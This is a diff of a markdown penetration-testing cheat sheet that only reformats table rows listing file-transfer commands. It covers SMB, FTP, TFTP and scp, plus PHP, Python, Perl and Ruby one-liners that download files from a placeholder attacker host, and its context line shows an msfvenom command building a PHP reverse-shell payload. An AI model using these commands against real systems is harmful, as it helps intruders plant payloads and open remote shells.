@@ -373,21 +373,21 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 | copy \IP_ADDR\SHARE\output_file	| Copy command to download files from an SMB share |
 | smbget smb://domain;user[:password@]server/share/path/file	| smbget utility to download files from a Samba share |
 | wget ftp://user:password@IP_ADDR/path/file -o output_file |
-| - FTP
-| echo open 192.168.1.64 21> ftp.txt
-echo anonymous>> ftp.txt
-echo ftp@ftp.com>> ftp.txt
-echo bin >> ftp.txt
-echo get test.txt >> ftp.txt
-echo bye >> ftp.txt
-ftp -s:ftp.txt	Wget and FTP to download files from an FTP server |
+| - FTP | FTP |
+| echo open 192.168.1.64 21> ftp.txt | FTP |
+| echo anonymous>> ftp.txt | FTP |
+| echo ftp@ftp.com>> ftp.txt | FTP |
+| echo bin >> ftp.txt | FTP |
+| echo get test.txt >> ftp.txt | FTP |
+| echo bye >> ftp.txt | FTP |
+| ftp -s:ftp.txt	| Wget and FTP to download files from an FTP server |
 | tftp |	tftp -i IP_ADDR {GET | PUT} file |
 | scp /path/file username@IP_ADDR:/path/file	| Secure File Copy SSH tool |
 | https://gist.github.com/Richienb/51021a1c16995a07478dfa20a6db725c	| Windows Virtual Basic scripts |
 | php -r “file_put_contents(‘output_file’, fopen(‘http://ip-addr:port/file’, ‘r’));”	| PHP file_put_contents function |
-| python -c ‘from urllib import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’;
+| python -c ‘from urllib import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’; | The Python urlretrieve function which is part of the urllib library can be used to download files |
 | python3 -c ‘from urllib.request import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’	| The Python urlretrieve function which is part of the urllib library can be used to download files |
-| perl -MLWP::Simple -e ‘getstore(“http://IP_ADDR/file”, “out_file”)’; 
+| perl -MLWP::Simple -e ‘getstore(“http://IP_ADDR/file”, “out_file”)’; | Library for WWW in Perl |
 | perl -e ‘use LWP::Simple; getstore(“http://IP_ADDR/file”, “out_file”)’	| Library for WWW in Perl |
 | ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do |file|;URI.open(“http://ip-addr:port/file”).read;end’	| Ruby Open-URI library |
 | echo -n “base64-output” > file	| Decoding the base64 output of the file |
